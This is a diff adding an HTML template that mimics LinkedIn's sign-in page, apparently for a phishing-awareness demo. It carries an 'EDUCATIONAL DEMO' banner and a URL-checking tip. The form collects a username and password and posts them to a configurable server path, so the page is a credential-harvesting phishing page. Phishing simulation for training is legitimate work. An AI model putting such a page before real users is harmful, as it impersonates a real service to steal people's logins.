@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LinkedIn Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .linkedin-blue { background-color: #0a66c2; }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="bg-red-100 border border-red-400 text-red-700 p-2 text-center">
+        <strong>EDUCATIONAL DEMO:</strong> {{ warning }}
+    </div>
+
+    <div class="max-w-md mx-auto py-8 px-4">
+        <div class="text-center mb-8">
+            <div class="w-16 h-16 linkedin-blue rounded flex items-center justify-center mx-auto mb-4">
+                <span class="text-white text-2xl font-bold">in</span>
+            </div>
+            <h1 class="text-2xl font-semibold">Sign in</h1>
+            <p class="text-gray-600">Stay updated on your professional world</p>
+        </div>
+
+        <form action="/{{ custom_path }}/submit" method="POST" class="space-y-4">
+            <input type="text" name="username" placeholder="Email or Phone" 
+                   class="w-full p-3 border rounded focus:outline-none focus:border-blue-500" required>
+            
+            <input type="password" name="password" placeholder="Password" 
+                   class="w-full p-3 border rounded focus:outline-none focus:border-blue-500" required>
+
+            <button type="submit" class="linkedin-blue text-white w-full p-3 rounded font-semibold">
+                Sign in
+            </button>
+
+            <div class="text-center">
+                <a href="#" class="text-blue-600 text-sm">Forgot password?</a>
+            </div>
+        </form>
+
+        <div class="mt-6 p-3 bg-blue-50 rounded text-sm">
+            <strong>Security Awareness:</strong> Always verify the URL is linkedin.com before entering credentials.
+        </div>
+    </div>
+</body>
+</html>
